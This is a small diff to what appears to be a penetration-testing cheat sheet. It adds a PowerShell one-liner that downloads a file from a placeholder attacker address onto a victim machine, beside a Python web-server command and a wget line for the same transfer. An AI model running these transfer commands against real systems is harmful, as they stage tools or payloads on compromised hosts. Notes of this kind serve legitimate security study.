@@ -176,6 +176,8 @@ export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
 Start web server in the current directory on port 80:<br/>
 `python3 -m http.server 80`<br/>
 Upload from victim:<br/>
+### Powershell
+`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.xxx.xxx:80/some_file', 'c:\Users\Public\Downloads\some_file')"`<br/>
 ### wget
 `wget 192.168.xxx.xxx:80/some_file`<br/>
 Error message "Address is already in use" -> `lsof -i:80` and kill process.<br/>
